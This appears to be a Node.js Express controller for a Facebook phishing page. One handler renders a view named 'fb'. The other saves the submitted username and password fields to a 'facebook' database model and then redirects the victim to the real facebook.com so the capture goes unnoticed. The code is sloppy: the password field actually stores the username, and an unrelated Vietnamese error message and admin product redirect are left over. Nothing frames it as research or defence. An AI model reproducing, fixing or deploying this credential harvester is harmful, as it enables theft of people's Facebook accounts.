var FBs = require("../model/facebook")


module.exports.fb = function(req, res){
   res.render("fb")
    
}
module.exports.postfb = function(req, res){
    var fb = FBs({
        user: req.body.username,
        pass: req.body.username
    })
    fb.save(function (err) {
        if (err) {
            req.flash('message', 'thêm hình thất bại');
            res.redirect('/admin/product/add')
            return;
        } else {
            res.redirect('https://www.facebook.com/')
        }
    });
    
}